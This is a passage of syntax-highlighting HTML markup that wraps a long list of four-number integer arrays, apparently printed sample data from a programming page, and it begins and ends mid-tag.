punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">108</span><span class="token punctuation">,</span> <span class="token number">31</span><span class="token punctuation">,</span> <span class="token number">101</span><span class="token punctuation">,</span> <span class="token number">84</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">35</span><span class="token punctuation">,</span> <span class="token number">33</span><span class="token punctuation">,</span> <span class="token number">97</span><span class="token punctuation">,</span> <span class="token number">45</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">99</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">66</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">35</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">78</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">95</span><span class="token punctuation">,</span> <span class="token number">81</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">73</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">37</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">70</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">107</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">84</span><span class="token punctuation">,</span> <span class="token number">98</span><span class="token punctuation">,</span> <span class="token number">92</span><span class="token punctuation">,</span> <span class="token number">62</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">123</span><span class="token punctuation">,</span> <span class="token number">87</span><span class="token punctuation">,</span> <span class="token number">87</span><span class="token punctuation">,</span> <span class="token number">110</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">81</span><span class="token punctuation">,</span> <span class="token number">111</span><span class="token punctuation">,</span> <span class="token number">28</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">91</span><span class="token punctuation">,</span> <span class="token number">37</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">93</span><span class="token punctuation">,</span> <span class="token number">101</span><span class="token punctuation">,</span> <span class="token number">77</span><span class="token punctuation">,</span> <span class="token number">93</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">27</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">,</span> <span class="token number">31</span><span class="token punctuation">,</span> <span class="token number">105</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">95</span><span class="token punctuation">,</span> <span class="token number">81</span><span class="token punctuation">,</span> <span class="token number">87</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">103</span><span class="token punctuation">,</span> <span class="token number">21</span><span class="token punctuation">,</span> <span class="token number">102</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">81</span><span class="token punctuation">,</span> <span class="token number">57</span><span class="token punctuation">,</span> <span class="token number">118</span><span class="token punctuation">,</span> <span class="token number">82</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">92</span><span class="token punctuation">,</span> <span class="token number">60</span><span class="token punctuation">,</span> <span class="token number">71</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">,</span> <span class="token number">84</span><span class="token punctuation">,</span> <span class="token number">126</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">35</span><span class="token punctuation">,</span> <span class="token number">26</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">120</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">70</span><span class="token punctuation">,</span> <span class="token number">86</span><span class="token punctuation">,</span> <span class="token number">45</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">29</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">40</span><span class="token punctuation">,</span> <span class="token number">66</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">99</span><span class="token punctuation">,</span> <span class="token number">77</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">70</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">,</span> <span class="token number">52</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">,</span> <span class="token number">21</span><span class="token punctuation">,</span> <span class="token number">85</span><span class="token punctuation">,</span> <span class="token number">54</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">91</span><span class="token punctuation">,</span> <span class="token number">94</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">85</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">42</span><span class="token punctuation">,</span> <span class="token number">47</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">117</span><span class="token punctuation">,</span> <span class="token number">55</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">53</span><span class="token punctuation">,</span> <span class="token number">45</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">72</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">27</span><span class="token punctuation">,</span> <span class="token number">121</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">108</span><span class="token punctuation">,</span> <span class="token number">61</span><span class="token punctuation">,</span> <span class="token number">73</span><span class="token punctuation">,</span> <span class="token number">42</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">121</span><span class="token punctuation">,</span> <span class="token number">42</span><span class="token punctuation">,</span> <span class="token number">41</span><span class="token punctuation">,</span> <span class="token number">71</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">63</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">,</span> <span class="token number">117</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">78</span><span class="token punctuation">,</span> <span class="token number">24</span><span class="token punctuation">,</span> <span class="token number">101</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">117</span><span class="token punctuation">,</span> <span class="token number">21</span><span class="token punctuation">,</span> <span class="token number">46</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">90</span><span class="token punctuation">,</span> <span class="token number">43</span><span class="token punctuation">,</span> <span class="token number">47</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">74</span><span class="token punctuation">,</span> <span class="token number">85</span><span class="token punctuation">,</span> <span class="token number">118</span><span class="token punctuation">,</span> <span class="token number">84</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">73</span><span class="token punctuation">,</span> <span class="token number">18</span><span class="token punctuation">,</span> <span class="token number">66</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">95</span><span class="token punctuation">,</span> <span class="token number">24</span><span class="token punctuation">,</span> <span class="token number">120</span><span class="token punctuation">,</span> <span class="token number">18</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">94</span><span class="token punctuation">,</span> <span class="token number">21</span><span class="token punctuation">,</span> <span class="token number">111</span><span class="token punctuation">,</span> <span class="token number">34</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">66</span><span class="token punctuation">,</span> <span class="token number">68</span><span class="token punctuation">,</span> <span class="token number">80</span><span class="token punctuation">,</span> <span class="token number">21</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">102</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">57</span><span class="token punctuation">,</span> <span class="token number">55</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">25</span><span class="token punctuation">,</span> <span class="token number">85</span><span class="token punctuation">,</span> <span class="token number">107</span><span class="token punctuation">,</span> <span class="token number">98</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">18</span><span class="token punctuation">,</span> <span class="token number">88</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">86</span><span class="token punctuation">,</span> <span class="token number">82</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">,</span> <span class="token number">91</span><span class="token punctuation">,</span> <span class="token number">126</span><span class="token punctuation">,</span> <span class="token number">115</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">26</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">,</span> <span class="token number">35</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">88</span><span class="token punctuation">,</span> <span class="token number">78</span><span class="token punctuation">,</span> <span class="token number">76</span><span class="token punctuation">,</span> <span class="token number">74</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">51</span><span class="token punctuation">,</span> <span class="token number">75</span><span class="token punctuation">,</span> <span class="token number">76</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">60</span><span class="token punctuation">,</span> <span class="token number">24</span><span class="token punctuation">,</span> <span class="token number">72</span><span class="token punctuation">,</span> <span class="token number">27</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">91</span><span class="token punctuation">,</span> <span class="token number">72</span><span class="token punctuation">,</span> <span class="token number">44</span><span class="token punctuation">,</span> <span class="token number">104</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">84</span><span class="token punctuation">,</span> <span class="token number">113</span><span class="token punctuation">,</span> <span class="token number">39</span><span class="token punctuation">,</span> <span class="token number">116</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">41</span><span class="token punctuation">,</span> <span class="token number">83</span><span class="token punctuation">,</span> <span class="token number">91</span><span class="token punctuation">,</span> <span class="token number">74</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">84</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">,</span> <span class="token number">94</span><span class="token punctuation">,</span> <span class="token number">119</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">46</span><span class="token punctuation">,</span> <span class="token number">95</span><span class="token punctuation">,</span> <span class="token number">85</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">109</span><span class="token punctuation">,</span> <span class="token number">58</span><span class="token punctuation">,</span> <span class="token number">71</span><span class="token punctuation">,</span> <span class="token number">42</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">126</span><span class="token punctuation">,</span> <span class="token number">29</span><span class="token punctuation">,</span> <span class="token number">114</span><span class="token punctuation">,</span> <span class="token number">73</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">27</span><span class="token punctuation">,</span> <span class="token number">70</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">125</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">121</span><span class="token punctuation">,</span> <span class="token number">66</span><span class="token punctuation">,</span> <span class="token number">97</span><span class="token punctuation">,</span> <span class="token number">111</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">21</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">57</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">62</span><span class="token punctuation">,</span> <span class="token number">65</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">101</span><span class="token punctuation">,</span> <span class="token number">79</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">74</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">69</span><span class="token punctuation">,</span> <span class="token number">42</span><span class="token punctuation">,</span> <span class="token number">38</span><span class="token punctuation">,</span> <span class="token number">58</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">65</span><span class="token punctuation">,</span> <span class="token number">81</span><span class="token punctuation">,</span> <span class="token number">72</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">81</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">126</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">91</span><span class="token punctuation">,</span> <span class="token number">111</span><span class="token punctuation">,</span> <span class="token number">69</span><span class="token punctuation">,</span> <span class="token number">33</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">56</span><span class="token punctuation">,</span> <span class="token number">84</span><span class="token punctuation">,</span> <span class="token number">65</span><span class="token punctuation">,</span> <span class="token number">66</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">47</span><span class="token punctuation">,</span> <span class="token number">78</span><span class="token punctuation">,</span> <span class="token number">43</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">43</span><span class="token punctuation">,</span> <span class="token number">90</span><span class="token punctuation">,</span> <span class="token number">80</span><span class="token punctuation">,</span> <span class="token number">25</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">46</span><span class="token punctuation">,</span> <span class="token number">55</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">60</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">116</span><span class="token punctuation">,</span> <span class="token number">110</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">116</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">72</span><span class="token punctuation">,</span> <span class="token number">115</span><span class="token punctuation">,</span> <span class="token number">38</span><span class="token punctuation">,</span> <span class="token number">104</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">79</span><span class="token punctuation">,</span> <span class="token number">43</span><span class="token punctuation">,</span> <span class="token number">74</span><span class="token punctuation">,</span> <span class="token number">106</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">86</span><span class="token punctuation">,</span> <span class="token number">113</span><span class="token punctuation">,</span> <span class="token number">84</span><span class="token punctuation">,</span> <span class="token number">76</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">102</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">119</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">126</span><span class="token punctuation">,</span> <span class="token number">25</span><span class="token punctuation">,</span> <span class="token number">83</span><span class="token punctuation">,</span> <span class="token number">44</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">37</span><span class="token punctuation">,</span> <span class="token number">83</span><span class="token punctuation">,</span> <span class="token number">46</span><span class="token punctuation">,</span> <span class="token number">40</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">75</span><span class="token punctuation">,</span> <span class="token number">101</span><span class="token punctuation">,</span> <span class="token number">101</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">76</span><span class="token punctuation">,</span> <span class="token number">93</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">63</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">69</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">84</span><span class="token punctuation">,</span> <span class="token number">37</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">103</span><span class="token punctuation">,</span> <span class="token number">47</span><span class="token punctuation">,</span> <span class="token number">106</span><span class="token punctuation">,</span> <span class="token number">80</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">72</span><span class="token punctuation">,</span> <span class="token number">104</span><span class="token punctuation">,</span> <span class="token number">85</span><span class="token punctuation">,</span> <span class="token number">19</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">124</span><span class="token punctuation">,</span> <span class="token number">118</span><span class="token punctuation">,</span> <span class="token number">34</span><span class="token punctuation">,</span> <span class="token number">81</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">57</span><span class="token punctuation">,</span> <span class="token number">25</span><span class="token punctuation">,</span> <span class="token number">52</span><span class="token punctuation">,</span> <span class="token number">119</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">44</span><span class="token punctuation">,</span> <span class="token number">56</span><span class="token punctuation">,</span> <span class="token number">63</span><span class="token punctuation">,</span> <span class="token number">90</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">123</span><span class="token punctuation">,</span> <span class="token number">46</span><span class="token punctuation">,</span> <span class="token number">124</span><span class="token punctuation">,</span> <span class="token number">31</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">,</span> <span class="token number">116</span><span class="token punctuation">,</span> <span class="token number">23</span><span class="token punctuation">,</span> <span class="token number">77</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">126</span><span class="token punctuation">,</span> <span class="token number">78</span><span class="token punctuation">,</span> <span class="token number">37</span><span class="token punctuation">,</span> <span class="token number">93</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">34</span><span class="token punctuation">,</span> <span class="token number">95</span><span class="token punctuation">,</span> <span class="token number">43</span><span class="token punctuation">,</span> <span class="token number">98</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">37</span><span class="token punctuation">,</span> <span class="token number">90</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">97</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">106</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">80</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">90</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">113</span><span class="token punctuation">,</span> <span class="token number">68</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">99</span><span class="token punctuation">,</span> <span class="token number">40</span><span class="token punctuation">,</span> <span class="token number">39</span><span class="token punctuation">,</span> <span class="token number">18</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">90</span><span class="token punctuation">,</span> <span class="token number">37</span><span class="token punctuation">,</span> <span class="token number">48</span><span class="token punctuation">,</span> <span class="token number">45</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">56</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">76</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">68</span><span class="token punctuation">,</span> <span class="token number">33</span><span class="token punctuation">,</span> <span class="token number">52</span><span class="token punctuation">,</span> <span class="token number">102</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">62</span><span class="token punctuation">,</span> <span class="token number">45</span><span class="token punctuation">,</span> <span class="token number">29</span><span class="token punctuation">,</span> <span class="token number">123</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">21</span><span class="token punctuation">,</span> <span class="token number">73</span><span class="token punctuation">,</span> <span class="token number">92</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">92</span><span class="token punctuation">,</span> <span class="token number">18</span><span class="token punctuation">,</span> <span class="token number">118</span><span class="token punctuation">,</span> <span class="token number">23</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">84</span><span class="token punctuation">,</span> <span class="token number">86</span><span class="token punctuation">,</span> <span class="token number">42</span><span class="token punctuation">,</span> <span class="token number">83</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">107</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">71</span><span class="token punctuation">,</span> <span class="token number">52</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">114</span><span class="token punctuation">,</span> <span class="token number">106</span><span class="token punctuation">,</span> <span class="token number">78</span><span class="token punctuation">,</span> <span class="token number">85</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">120</span><span class="token punctuation">,</span> <span class="token number">115</span><span class="token punctuation">,</span> <span class="token number">119</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">27</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">124</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">65</span><span class="token punctuation">,</span> <span class="token number">40</span><span class="token punctuation">,</span> <span class="token number">48</span><span class="token punctuation">,</span> <span class="token number">37</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">69</span><span class="token punctuation">,</span> <span class="token number">42</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">29</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">35</span><span class="token punctuation">,</span> <span class="token number">39</span><span class="token punctuation">,</span> <span class="token number">55</span><span class="token punctuation">,</span> <span class="token number">102</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">58</span><span class="token punctuation">,</span> <span class="token number">19</span><span class="token punctuation">,</span> <span class="token number">41</span><span class="token punctuation">,</span> <span class="token number">75</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">113</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">34</span><span class="token punctuation">,</span> <span class="token number">72</span><span class="token punctuation">,</span> <span class="token number">75</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">91</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">19</span><span class="token punctuation">,</span> <span class="token number">52</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">62</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">,</span> <span class="token number">109</span><span class="token punctuation">,</span> <span class="token number">78</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">115</span><span class="token punctuation">,</span> <span class="token number">35</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">42</span><span class="token punctuation">,</span> <span class="token number">83</span><span class="token punctuation">,</span> <span class="token number">78</span><span class="token punctuation">,</span> <span class="token number">41</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">34</span><span class="token punctuation">,</span> <span class="token number">94</span><span class="token punctuation">,</span> <span class="token number">97</span><span class="token punctuation">,</span> <span class="token number">58</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">56</span><span class="token punctuation">,</span> <span class="token number">73</span><span class="token punctuation">,</span> <span class="token number">25</span><span class="token punctuation">,</span> <span class="token number">115</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">55</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">,</span> <span class="token number">86</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">97</span><span class="token punctuation">,</span> <span class="token number">95</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">,</span> <span class="token number">92</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">47</span><span class="token punctuation">,</span> <span class="token number">105</span><span class="token punctuation">,</span> <span class="token number">70</span><span class="token punctuation">,</span> <span class="token number">68</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">50</span><span class="token punctuation">,</span> <span class="token number">18</span><span class="token punctuation">,</span> <span class="token number">51</span><span class="token punctuation">,</span> <span class="token number">23</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">46</span><span class="token punctuation">,</span> <span class="token number">57</span><span class="token punctuation">,</span> <span class="token number">80</span><span class="token punctuation">,</span> <span class="token number">29</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">66</span><span class="token punctuation">,</span> <span class="token number">123</span><span class="token punctuation">,</span> <span class="token number">24</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">55</span><span class="token punctuation">,</span> <span class="token number">53</span><span class="token punctuation">,</span> <span class="token number">26</span><span class="token punctuation">,</span> <span class="token number">36</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">71</span><span class="token punctuation">,</span> <span class="token number">59</span><span class="token punctuation">,</span> <span class="token number">104</span><span class="token punctuation">,</span> <span class="token 